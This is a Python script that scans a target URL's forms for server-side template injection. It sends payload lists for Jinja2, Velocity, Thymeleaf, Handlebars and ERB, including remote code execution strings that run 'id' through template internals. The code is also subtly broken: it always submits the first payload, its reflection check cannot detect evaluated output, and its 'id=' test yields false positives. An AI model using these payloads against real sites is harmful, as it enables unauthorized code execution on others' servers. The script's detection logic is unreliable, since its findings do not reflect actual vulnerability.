import requests
from bs4 import BeautifulSoup
import sys
from colorama import init, Fore

init(autoreset=True)  # Initialize colorama

# List of payloads to test for SSTI for different engines
payloads = [
    # Jinja2, Tornado, Twig
    "{{7*7}}",
    "{{7*'7'}}",
    "{{7+7}}",
    "{{ '7'*7 }}",
    "{{ config }}",
    "{{ ''.__class__.__mro__[1].__subclasses__()[40]('id').read() }}",
    "{{ self._Module__dict__.keys() }}",
    "{{ request.__class__.mro()[1].__subclasses__()[40]('id').read() }}",
    
    # Velocity, Freemarker
    "${7*7}",
    "${'7'*7}",
    "${3+3}",
    "${'${7*7}'}",
    
    # Thymeleaf
    "#{7*7}",
    "#{7+7}",
    "#{ T(java.lang.Runtime).getRuntime().exec('id') }",
    
    # Handlebars
    "{{#with (lookup . 'constructor')}}{{constructor}}:{{/with}}",
    "{{constructor.constructor.constructor('return process.mainModule.require(\"child_process\").execSync(\"id\").toString()')()}}",
    
    # ERB (Embedded Ruby)
    "<%= 7*7 %>",
    "<%= `id` %>",
    
    # Mustache
    "{{#foo}}{{bar}}{{/foo}}",
    "{{#foo}}{{foo}}{{/foo}}",
    
    # Additional payloads
    # Jinja2 Advanced
    "{{ ''.__class__.__mro__[1].__subclasses__()[40]('id').read() }}",
    "{{ ''.__class__.__mro__[1].__subclasses__()[40]('id').read() }}",
    
    # Velocity/Freemarker Advanced
    "${ T(java.lang.Runtime).getRuntime().exec('id').text }",
    "${'${T(java.lang.Runtime).getRuntime().exec("id").text}'}",
    
    # Thymeleaf Advanced
    "#{ T(java.lang.Runtime).getRuntime().exec('id').text }",
    
    # Handlebars Advanced
    "{{#with (lookup . 'constructor')}}{{constructor}}:{{/with}}",
    "{{#with (lookup . 'constructor')}}{{constructor}}:{{/with}}",
]

def check_ssti(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
    except requests.RequestException as e:
        print(Fore.RED + f"Error: Unable to access {url} - {e}")
        return False

    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form')

    if not forms:
        print(Fore.RED + "No forms found on the page.")
        return False

    for form in forms:
        action = form.get('action') or url
        method = form.get('method', 'get').lower()
        inputs = form.find_all('input')
        data = {input.get('name'): payloads[0] for input in inputs if input.get('name')}

        for payload in payloads:
            print(Fore.YELLOW + f"Testing payload: {payload}")

            if method == 'post':
                response = requests.post(action, data=data)
            else:
                response = requests.get(action, params=data)

            if payload.replace('*', '') in response.text or payload.replace(' ', '') in response.text:
                print(Fore.GREEN + f"Vulnerable to SSTI with payload: {payload}")
                if try_code_injection(action, method, data, payload):
                    return True
                else:
                    return False

    print(Fore.RED + "No SSTI vulnerability found.")
    return False

def try_code_injection(url, method, data, payload):
    code_payloads = [
        # Test for code execution if vulnerable
        "{{7*7}}",  # Simple math
        "{{7*'7'}}",  # Simple string repetition
        "{{ config.__class__.__mro__[1].__subclasses__()[40]('id').read() }}",  # Jinja2 RCE
        "${7*7}",  # Velocity, Freemarker
        "#{7*7}",  # Thymeleaf
        "<%= `id` %>",  # ERB
        "{{ '7'*7 }}",  # Jinja2
        "{{ ''.__class__.__mro__[1].__subclasses__()[40]('id').read() }}",  # Advanced Jinja2
        "${T(java.lang.Runtime).getRuntime().exec('id').text}",  # Advanced Velocity
        "#{T(java.lang.Runtime).getRuntime().exec('id').text}",  # Advanced Thymeleaf
        "{{#with (lookup . 'constructor')}}{{constructor}}:{{/with}}",  # Advanced Handlebars
    ]

    for code_payload in code_payloads:
        data = {key: code_payload if value == payload else value for key, value in data.items()}

        print(Fore.YELLOW + f"Trying code injection with payload: {code_payload}")

        if method == 'post':
            response = requests.post(url, data=data)
        else:
            response = requests.get(url, params=data)

        if "uid=" in response.text or "gid=" in response.text or "id=" in response.text:
            print(Fore.GREEN + "Successful code injection!")
            return True

    print(Fore.RED + "Code injection failed.")
    return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python ssti_checker.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    check_ssti(url)
